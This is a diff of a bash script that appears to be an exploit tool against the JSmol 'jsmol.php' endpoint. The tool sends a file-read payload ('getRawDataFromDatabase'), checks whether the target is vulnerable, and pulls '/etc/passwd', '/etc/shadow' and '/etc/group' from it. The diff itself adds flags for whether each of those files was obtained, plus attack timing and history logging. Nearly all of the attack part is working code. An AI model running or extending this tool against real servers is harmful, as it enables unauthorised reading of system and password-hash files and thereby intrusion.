@@ -20,13 +20,16 @@ payload_b64='isform=true&call=getRawDataFromDatabase&source=post_page-----------
 #download_files='/etc/passwd /etc/shadow /etc/group'
 download_files=$(cat "$dl_list_file"|egrep -v "^#")
 total_files_to_dl=$(cat $dl_list_file|wc -l)
+attack_date_start=$(/bin/date "+%s")
 
 #working vars
 continue_tests='TRUE'
 is_vuln='FALSE'
 payload_types=('TXT' 'B64')
 functionnal_payload=''
-
+got_passwd='FALSE'
+got_shadow='FALSE'
+got_group='FALSE'
 
 if [ ${#1} -eq 0 ];then
 	echo "$0 [http://target/uri/till/jsmol.php]"
@@ -73,6 +76,10 @@ if [ $is_vuln = "TRUE" ];then
 else
 	showTitle "This shit is not vulnerable!" "$c_error""Game over!" "1"
 fi
+#logging in history file=
+attack_date_end=$(/bin/date "+%s")
+attack_duration=$(( $attack_date_end-$attack_date_start ))
+saveToHistory
 #end
 showTitle "Quitting" "" "0"
 showTitle "Remove temporary files" "" "1"
